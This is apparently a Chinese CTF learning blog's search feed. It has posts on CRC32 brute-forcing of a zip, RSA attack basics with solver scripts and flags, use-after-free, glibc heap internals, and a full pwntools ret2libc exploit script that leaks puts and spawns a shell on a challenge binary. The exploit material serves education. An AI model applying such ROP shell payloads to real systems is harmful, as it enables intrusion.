title="小文件"></a>小文件</h3><p>小文件打开下载的压缩包发现有八个txt文件，压缩包是经过加密的。但是观察之后发现每一个txt文件的大小都是5个字节，这就让<br>我想到了CRC32爆破。百度查阅了一下资料，虽然没有现成的5位爆破脚本，但是还是有可以借鉴的一些博客，最后贴上自己的爆破<br>脚本：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">import binascii</span><br><span class="line">def crack():</span><br><span class="line"></span><br><span class="line">crcs = [0x0a4af641,0x299bb815,0x2d978ea0,0x33caa3a4,0x99691d6d,0xa251850c,0xaecac058,0xe2ed6d65]</span><br><span class="line">r = xrange(32,127)</span><br><span class="line">for a in r:</span><br><span class="line">for b in r:</span><br><span class="line">for c in r:</span><br><span class="line">for d in r:</span><br><span class="line">for e in r:</span><br><span class="line">txt = chr(a)+chr(b)+chr(c)+chr(d)+chr(e)</span><br><span class="line">crc = binascii.crc32(txt)</span><br><span class="line">for i in crcs:</span><br><span class="line">if (crc&amp;0xffffffff) == i:</span><br><span class="line">print txt</span><br><span class="line">print i</span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">crack()</span><br></pre></td></tr></table></figure><p>写脚本能力有限，跑得很慢，一觉睡醒发现终于全部跑完了<br><img src="/img/crc32.jpg" alt="avatar"><br>还是要学习一下多线程的爆破，要不这种爆破脚本效率实在是太低了</p><h2 id="未完待续……"><a href="#未完待续……" class="headerlink" title="未完待续……"></a>未完待续……</h2>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>初次学习RSA密码</title>
      <link href="/2019/09/10/%E5%88%9D%E6%AC%A1%E5%AD%A6%E4%B9%A0RSA%E5%AF%86%E7%A0%81/"/>
      <url>/2019/09/10/%E5%88%9D%E6%AC%A1%E5%AD%A6%E4%B9%A0RSA%E5%AF%86%E7%A0%81/</url>
      
        <content type="html"><![CDATA[<p>   ctf比赛中，密码是十分重要的一块内容，而这其中RSA密码也是最重要最基础的一块，所以今天就花一点时间来好好总结梳理<br>一下RSA密码的各种知识。</p><a id="more"></a><h2 id="RSA密码的基本知识"><a href="#RSA密码的基本知识" class="headerlink" title="RSA密码的基本知识"></a>RSA密码的基本知识</h2><p>要学习RSA密码，我们首先需要了解的就是它的一些基本原理。RSA加密，是一种利用公钥私钥对明文进行加密的一种加密算法，其中运<br>用了很多数学知识，现在我们先来把这些数学知识梳理一下。</p><h3 id="素数，互质数"><a href="#素数，互质数" class="headerlink" title="素数，互质数"></a>素数，互质数</h3><p>素数：一个数如果出了1和它本身之外没有其他的因数，那么就是一个素数。这是一个很简单的数学概念。</p><p>互质数：如果两个整数a,b的最大公因数（greatest common divisor）为1，即gcb(a,b)=1，那么称a,b两数互质</p><h3 id="欧拉函数值"><a href="#欧拉函数值" class="headerlink" title="欧拉函数值"></a>欧拉函数值</h3><p>设m为正整数，则1,2,3,4…….,m中与m互素的整数的个数记为φ(m)，叫做欧拉函数，欧拉函数的值叫做欧拉函数值。</p><h3 id="取模运算与同余"><a href="#取模运算与同余" class="headerlink" title="取模运算与同余"></a>取模运算与同余</h3><p>模运算即求余运算。“模”是“Mod”的音译。和模运算紧密相关的一个概念是“同余”。数学上，当两个整数除以同一个正整数，若得相同余<br>数，则二整数同余。<br>两个整数a，b，若它们除以正整数m所得的余数相等，则称a，b对于模m同余，记作: a ≡ b (mod m)<br>；读作：a同余于b模m，或者，a与b关于模m同余。例如：26 ≡ 14 (mod 12)。</p><h3 id="模指数运算"><a href="#模指数运算" class="headerlink" title="模指数运算"></a>模指数运算</h3><p>模指数运算即先进行指数运算，在进行模运算</p><h2 id="RSA加密算法"><a href="#RSA加密算法" class="headerlink" title="RSA加密算法"></a>RSA加密算法</h2><h3 id="RSA加密涉及元素"><a href="#RSA加密涉及元素" class="headerlink" title="RSA加密涉及元素"></a>RSA加密涉及元素</h3><p>N：大整数N，我们称之为模数（modulus）<br>p 和 q ：大整数N的两个因子（factor）<br>e 和 d：互为模反数的两个指数（exponent）<br>c 和 m：分别是密文和明文，这里一般指的是一个十进制的数还有一个就是n的欧拉函数值，在求解d的时候常用</p><h3 id="算法的实现"><a href="#算法的实现" class="headerlink" title="算法的实现"></a>算法的实现</h3><p>N = p<em>q<br>1.φ(n) = (p-1)(q-1) ;这里的φ(n)即为n的欧拉函数值<br>2.选择一个e(1&lt; e &lt;φ(n))<br>3.d</em>e ≡ 1 (mod φ(n)),求出d</p><p>最后，以{e,n}为公开密钥，以{d,n}为秘密秘钥</p><p>在知道这些信息之后，我们就可以开始进行数据的加密和解密了</p><p>我们假设Bob要向Alice发送一些信息m，Bob知道的是公钥{e，n}，然后计算密文 c ≡ ^e (mod n)，然后就可以把密文c发送给Al<br>ice了。</p><p>接收方Alice在接收到信息c之后，就可以用自己掌握的私钥{d，n}计算 m ≡ c^d (mod n) ///φ(n)也可写成phi</p><p>这就是最基本的RSA算法的加解密方式，从这里我们也可以开始探索最简单的RSA攻击方法</p><h2 id="针对RSA加密的各种攻击方法"><a href="#针对RSA加密的各种攻击方法" class="headerlink" title="针对RSA加密的各种攻击方法"></a>针对RSA加密的各种攻击方法</h2><h3 id="针对模数n的因数分解"><a href="#针对模数n的因数分解" class="headerlink" title="针对模数n的因数分解"></a>针对模数n的因数分解</h3><p>分解模数n是最简单的但同时也是最困难的一种攻击方式。在我们掌握了这次加密的公钥e和模数n后，如果我们可以将n分解成p和q，<br>我们就可以计算出phi = (p-1)(q-1)</p><p>这里我们可以看一下实验吧的一道RSA题目：</p><p><img src="/img/RSA1.jpg" alt="avatar"></p><p>这道题很直接的给出了公钥n，e，所以我们只要分解出p和q，这道题就好了。<br>首先分解模数n,这里我们可以采用在线分解模数的方法，推荐链接：<a href="http://www.factordb.com/index.php" target="_blank" rel="noopener">http://www.factordb.com/index.php</a><br>分解出来p = 18443,q = 49891<br>这样我们自己写一个脚本快速求解了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">import gmpy2</span><br><span class="line">p = gmpy2.mpz(18443)   #初始化大数</span><br><span class="line">q = gmpy2.mpz(49891)</span><br><span class="line">n = 920139713</span><br><span class="line">e = gmpy2.mpz(19)</span><br><span class="line">phi = (p-1)*(q-1)</span><br><span class="line">d = gmpy2.invert(e,phi)   </span><br><span class="line">print d</span><br><span class="line">c = open(&apos;key.txt&apos;,&apos;ra&apos;).read().split(&apos;\r\n&apos;)</span><br><span class="line">flag = &apos;&apos;</span><br><span class="line">for i in range(len(c)-1):</span><br><span class="line">flag+=chr(pow(int(c[i]),d,n))</span><br><span class="line">print flag</span><br></pre></td></tr></table></figure><p><img src="/img/RSA2.jpg" alt="avatar"></p><p>这样就得出了flag{13212je2ue28fy71w8u87y31r78eu1e2}</p><h3 id="针对pem和enc文件"><a href="#针对pem和enc文件" class="headerlink" title="针对pem和enc文件"></a>针对pem和enc文件</h3><p>当题目给我们的是pem文件时，我们有两种方法处理它。<br>例子：jarvisoj上的mediumRSA</p><ul><li>利用openssl来进行解密<br>题目给了我们public.pem这个公钥文件，所以要先分解出n和e来<br>使用 openssl rsa -pubin -text -modulus -in public.pem<br><img src="/img/openssl.jpg" alt="avatar"></li></ul><p>n = 0xC2636AE5C3D8E43FFB97AB09028F1AAC6C0BF6CD3D70EBCA281BFFE97FBE30DD<br>转化成十进制<br>n = 87924348264132406875276140514499937145050893665602592992418171647042491658461<br>e = 65537<br>直接在线网站分解得出：<br>rsa.p = 275127860351348928173285174381581152299<br>rsa.q = 319576316814478949870590164193048041239<br>这样就可以直接用脚本写出私钥文件了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">import gmpy2</span><br><span class="line">from Crypto.PublicKey import RSA</span><br><span class="line"></span><br><span class="line">rsa = RSA.generate(1024)</span><br><span class="line">rsa.p = 275127860351348928173285174381581152299</span><br><span class="line">rsa.q = 319576316814478949870590164193048041239</span><br><span class="line">rsa.e = 65537</span><br><span class="line">rsa.n = rsa.p*rsa.q</span><br><span class="line">phi = (rsa.p-1)*(rsa.q-1)</span><br><span class="line">i = 1</span><br><span class="line">while (True):</span><br><span class="line">    x = (phi * i ) + 1</span><br><span class="line">    if (x % rsa.e == 0):</span><br><span class="line">        rsa.d = x / rsa.e</span><br><span class="line">break</span><br><span class="line">    i += 1</span><br><span class="line">    </span><br><span class="line">print rsa.d</span><br><span class="line">private = open(&apos;private.pem&apos;,&apos;w&apos;)</span><br><span class="line">private.write(rsa.exportKey())</span><br><span class="line">private.close()</span><br></pre></td></tr></table></figure><p>脚本运行之后生成了一个private.pem的私钥文件<br>使用命令：openssl rasult -in flag.enc -inkey private.pem -out flag.dec<br>得到flag：PCTF{256b_i5_m3dium}</p><ul><li>公钥分析的步骤还可以利用python的RSA库<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">with open(&apos;./tmp/pubkey.pem&apos;, &apos;r&apos;) as f:</span><br><span class="line">    key = RSA.importKey(f)</span><br><span class="line">    N = key.n</span><br><span class="line">    e = key.e</span><br></pre></td></tr></table></figure></li></ul><p>这次就先写这些吧，还是一个小菜鸡，要多学习学习。准备整理一下RSA攻击的各种方法。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 密码学 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>use after free的学习</title>
      <link href="/2019/07/31/use-after-free%E7%9A%84%E5%AD%A6%E4%B9%A0/"/>
      <url>/2019/07/31/use-after-free%E7%9A%84%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<p>初学堆的漏洞利用，就从最简单的Use After Free来学习吧！</p><a id="more"></a><h2 id="简单介绍"><a href="#简单介绍" class="headerlink" title="简单介绍"></a>简单介绍</h2><p>其实uaf漏洞的利用跟chunk，bin等heap的内部操作没有什么关系<br>让程序有两个指针指向同一个记忆体</p><ul><li>一个是structure，另一块用作data buffer</li><li>利用对buffer的读写，修改或泄露structure的内容</li></ul><p>总的来说就是利用chunk的回收特性<br>所谓use after free,是指free(=p)掉后还继续使用它</p><ul><li>例：linked list remove掉物件后，忘了把指向它的指针清为NULL，导致以为该物件还存在list当中。</li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> heap </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>使用LibcSearcher解题</title>
      <link href="/2019/07/27/%E4%BD%BF%E7%94%A8LibcSearcher%E8%A7%A3%E9%A2%98/"/>
      <url>/2019/07/27/%E4%BD%BF%E7%94%A8LibcSearcher%E8%A7%A3%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<p>我们都知道，很多时候，我们做pwn题出题者是不会给我们libc文件的，这时候，我们就需要通过各种方法来获得libc的版本，libc的基址等。这时候我们首先想到的就是泄露一个函数的真实地址。这时候，我们就可以来查找我们需要的libc版本以及偏移。在以前，获取一个函数地址之后我们就可以在libc.database网站上直接查找libc版本等信息，但现在这个网站好像不行了，所以我们现在只能通过LibcSearcher库或者pwntools的DynELF来做题。</p><a id="more"></a><h2 id="LibcSearcher的基本用法"><a href="#LibcSearcher的基本用法" class="headerlink" title="LibcSearcher的基本用法"></a>LibcSearcher的基本用法</h2><p>LibcSearcher库的使用方法是非常简单的，只需要我们泄露出一个函数的真实地址之后，就可以利用这个库自带的工具来得出offset<br>了。具体代码大体如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">obj = LibcSearcher(&apos;puts&apos;,putsaddr) </span><br><span class="line">libc_base = putsaddr - obj.dump(&apos;puts&apos;) //算出libc基地址</span><br><span class="line">system = libc_base+obj.dump(&apos;system&apos;)   //算出各函数的真实地址</span><br><span class="line">bins = libc_base+obj.dump(&apos;str_bin_sh&apos;)</span><br></pre></td></tr></table></figure><h2 id="实际案例"><a href="#实际案例" class="headerlink" title="实际案例"></a>实际案例</h2><p>这里我们用攻防世界中的pwn_100这道题来实操一下。<br>这道题是一道非常基础的栈溢出题，是一个64位程序，开启了nx防护。<br>用ida看一下源码<br><img src="/img/pwn_100_1.jpg" alt="avatar"><br><img src="/img/pwn_100_2.jpg" alt="avatar"><br>从这里很容易找出栈溢出漏洞。直接给出脚本吧：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line">from LibcSearcher import *</span><br><span class="line"></span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line">p = process(&apos;./pwn100&apos;)</span><br><span class="line">e = ELF(&apos;./pwn100&apos;)</span><br><span class="line">puts_plt = e.plt[&apos;puts&apos;]</span><br><span class="line">puts_got = e.got[&apos;puts&apos;]</span><br><span class="line">pop_rdi = 0x400763</span><br><span class="line">pop_rsi = 0x400761</span><br><span class="line">start = 0x400550</span><br><span class="line">payload = &apos;a&apos;*0x48+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(start)</span><br><span class="line">payload = payload.ljust(200,&apos;a&apos;)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(&apos;~\n&apos;)</span><br><span class="line">putsaddr=u64(p.recv()[-7:-1].ljust(8,&apos;\x00&apos;))</span><br><span class="line">print hex(putsaddr)</span><br><span class="line">obj = LibcSearcher(&apos;puts&apos;,putsaddr)</span><br><span class="line">libc_base = putsaddr - obj.dump(&apos;puts&apos;)</span><br><span class="line">system = libc_base+obj.dump(&apos;system&apos;)</span><br><span class="line">bins = libc_base+obj.dump(&apos;str_bin_sh&apos;)</span><br><span class="line">payload1 = &apos;a&apos;*0x47 + p64(pop_rdi)+p64(bins)+p64(system)+p64(0xdeadbeef).ljust(200,&apos;a&apos;)</span><br><span class="line">p.sendline(payload1)</span><br><span class="line">#print(p.recv())</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>这样就十分好理解LibcSearcher这个工具了吧，功能强大，使用方便。</p>]]></content>
      
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>heap-1</title>
      <link href="/2019/07/21/heap-1/"/>
      <url>/2019/07/21/heap-1/</url>
      
        <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>正式开始学习heap的第一天，简单的在自己的博客里记录一下，当做自己的学习笔记。</p><a id="more"></a><p>各式命令:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ltrace -e &apos;malloc+free+&apos; ./heap  //可用来查看地址等内容</span><br><span class="line">p/x *(struct malloc_chunk*)0x602000 //gdb中以chunk的格式查看chunk里的内容</span><br><span class="line">p main_arena // 查看main_arena内容</span><br><span class="line">x/40gx 0x602000 //查看堆中内容</span><br></pre></td></tr></table></figure><ul><li>在linux的堆学习中，我们主要学习的就是malloc，relloc和free三个函数。</li><li>要知道：<br>  有哪些位置的记忆体是可以被分配的<br>  有哪些是因为被free掉而可以被回收的<br>  有哪些是使用中不需要记录，使用他们的人应该记住这些指标（heap本身并不会记录）</li><li>整个heap的资料记录在一个struct malloc_state中，名为main_arena<br>malloc分配的记忆体名为chunk，会比要求的大小要大一点，因为需要记录一些额外的data<br>Arena跟heap分配的记忆体分开存放，heap overflow没办法直接覆盖掉他的内容</li><li>回收的chunk用linked list记录，名为bin</li><li>main_arena中有很多bin，每个bin里储存的chunk size不同，目的是让malloc时可以尽快找到最适合大小的chunk</li><li>回收的chunk会依据size来决定应该放哪个linked list(bin)中<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">main_arena&#123;</span><br><span class="line">bin[0](size = 16) -&gt; chunk1 -&gt; chunk5</span><br><span class="line">bin[1](size = 32) -&gt; chunk2 -&gt; chunk3 -&gt; chunk4</span><br><span class="line">bin[2](size = 48) -&gt; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h2 id="基本内容"><a href="#基本内容" class="headerlink" title="基本内容"></a>基本内容</h2><p>然后我们可以自己编写一个heap.c来看heap的操作会发生什么事情。<br>首先我们进入gdb进行调试，将断点断在main，跑起来，输入p main_arena 就可以看到：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">$1 = &#123;</span><br><span class="line">  mutex = 0x0, </span><br><span class="line">  flags = 0x0, </span><br><span class="line">  fastbinsY = &#123;0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0&#125;, </span><br><span class="line">  top = 0x0, </span><br><span class="line">  last_remainder = 0x0, </span><br><span class="line">  bins = &#123;0x0 &lt;repeats 254 times&gt;&#125;, </span><br><span class="line">  binmap = &#123;0x0, 0x0, 0x0, 0x0&#125;, </span><br><span class="line">  next = 0x7ffff7dd1b20 &lt;main_arena&gt;, </span><br><span class="line">  next_free = 0x0, </span><br><span class="line">  attached_threads = 0x1, </span><br><span class="line">  system_mem = 0x0, </span><br><span class="line">  max_system_mem = 0x0</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后，我们可以使用p main_arena.bins [0]命令来查看bin[0]的内容，同时通过vmmap命令可以看到，在本程序中heap的起始位置<br>在0x602000，使用x/40gx 0x602000就可以查看堆中的内容了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">0x602000:0x00000000000000000x00000000000000a1</span><br><span class="line">0x602010:0x00000000000000000x0000000000000000</span><br><span class="line">0x602020:0x00000000000000000x0000000000000000</span><br><span class="line">0x602030:0x00000000000000000x0000000000000000</span><br><span class="line">0x602040:0x00000000000000000x0000000000000000</span><br><span class="line">0x602050:0x00000000000000000x0000000000000000</span><br><span class="line">0x602060:0x00000000000000000x0000000000000000</span><br><span class="line">0x602070:0x00000000000000000x0000000000000000</span><br><span class="line">0x602080:0x00000000000000000x0000000000000000</span><br><span class="line">0x602090:0x00000000000000000x0000000000000000</span><br><span class="line">0x6020a0:0x00000000000000000x00000000000000a1</span><br><span class="line">0x6020b0:0x00000000000000000x0000000000000000</span><br><span class="line">0x6020c0:0x00000000000000000x0000000000000000</span><br><span class="line">0x6020d0:0x00000000000000000x0000000000000000</span><br><span class="line">0x6020e0:0x00000000000000000x0000000000000000</span><br><span class="line">0x6020f0:0x00000000000000000x0000000000000000</span><br><span class="line">0x602100:0x00000000000000000x0000000000000000</span><br><span class="line">0x602110:0x00000000000000000x0000000000000000</span><br><span class="line">0x602120:0x00000000000000000x0000000000000000</span><br><span class="line">0x602130:0x00000000000000000x0000000000000000</span><br></pre></td></tr></table></figure><p>这就是两个chunk的内容，之后还会提到<strong>top chunk</strong>的内容，以后再学习吧。</p><h2 id="chunk的知识"><a href="#chunk的知识" class="headerlink" title="chunk的知识"></a>chunk的知识</h2><p>存放chunk metadata的chunk结构(header):</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">struct malloc_chunk&#123;</span><br><span class="line">size_t prev_size;</span><br><span class="line">size_t size;</span><br><span class="line">malloc_chunk* fd;//当chunk处于inuse状态的时候fd和bk是不需要的，就用来放userdata</span><br><span class="line">malloc_chunk* bk;</span><br><span class="line">malloc_chunk* fd_nextsize;</span><br><span class="line">malloc_chunk* bk_nextsize;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>(64bit):mem = malloc(size)<br>-&gt; chunk = mem - 16(32bit则是8);chunksize = (size+8)#16 </p><ul><li>实际chunk地址是malloc得到的地址减去16</li><li>chunksize是size+8后向上对齐到16的倍数，因为要存放额外的资料</li></ul><p>下面我们看一看chunk在被使用的条件之下，结构是什么样子的。<br><img src="/img/inuse.jpg" alt="avatar"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">int main()&#123;</span><br><span class="line">void *p,*q;</span><br><span class="line">p = malloc(152);</span><br><span class="line">q = malloc(10);</span><br><span class="line">memset(p,&apos;A&apos;,152);</span><br><span class="line">free(p);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在如上代码的情况下，我们输入x/36gx 0x602000查看堆中布局，会看到如下代码：<br><img src="/img/chunk.jpg" alt="avatar"><br>从这里我们就可以知道，为什么chunksize需要+8，因为我们可以覆盖到下一个chunk的前8个bit<br>再看not inuse时的情况：<br><img src="/img/noinuse.jpg" alt="avatar"><br>在把p释放掉以后</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/36gx 0x602000</span><br><span class="line">0x602000:0x00000000000000000x00000000000000a1</span><br><span class="line">0x602010:0x00007ffff7dd1b780x00007ffff7dd1b78//fd和bk</span><br><span class="line">0x602020:0x41414141414141410x4141414141414141</span><br><span class="line">0x602030:0x41414141414141410x4141414141414141</span><br><span class="line">0x602040:0x41414141414141410x4141414141414141</span><br><span class="line">0x602050:0x41414141414141410x4141414141414141</span><br><span class="line">0x602060:0x41414141414141410x4141414141414141</span><br><span class="line">0x602070:0x41414141414141410x4141414141414141</span><br><span class="line">0x602080:0x41414141414141410x4141414141414141</span><br><span class="line">0x602090:0x41414141414141410x4141414141414141</span><br><span class="line">0x6020a0:0x00000000000000a00x0000000000000020//这里a0就是prev_size，如果我这个chunk正在使用，就不需要</span><br><span class="line">0x6020b0:0x00000000000000000x0000000000000000</span><br><span class="line">0x6020c0:0x00000000000000000x0000000000020f41</span><br><span class="line">0x6020d0:0x00000000000000000x0000000000000000</span><br></pre></td></tr></table></figure><h3 id="chunk的栏位"><a href="#chunk的栏位" class="headerlink" title="chunk的栏位"></a>chunk的栏位</h3><ul><li>size:这个chunk在记忆体里的大小</li><li>fd，bk：指向bin里前一、后一个chunk(一般来说，bin是double linked list)</li><li>prev_size：前一个chunk的size，</li></ul><p>这种情况之下，每个chunk可以看到相邻的4个chunk：</p><ul><li>下一个chunk是chunk+size</li><li>前一个chunk是chunk-prev_size</li></ul><h3 id="size的栏位"><a href="#size的栏位" class="headerlink" title="size的栏位"></a>size的栏位</h3><p>size栏位包含chunk size和flag bits<br>chunk size最低三个bit有flag的作用</p><ul><li>fastbin&lt;= </li><li>smallbin&lt;1024</li><li>largebin</li><li>mmap&gt;=0x20000</li></ul><p>最低的bit为prev_inuse bit,用来表示前一个chunk是不是被使用</p><ul><li>free会使得下个个chunk的prev_inuse bit 被设为0</li></ul><p>在上面那个实例当中，当我们free(p)之后，我们会发现，q的size的最后一位变成了0，这就代表p not_inise</p><h2 id="heap的操作"><a href="#heap的操作" class="headerlink" title="heap的操作"></a>heap的操作</h2><p>p = malloc(size)</p><ul><li>找出一个可用的chunk，或者从top chunk上切下来一块</li><li>如果这个chunk是回收的，要先从bin中unlink，即移出linked list</li><li>填好结构，并回传chunk+16</li></ul><p>free(p)</p><ul><li>检查一下该chunk前后的chunk是不是not inuse</li><li>如果有，则这些回收的记忆体可以被合并成一块</li><li>合并成新的chunk，放进对应的bin中</li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> heap </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
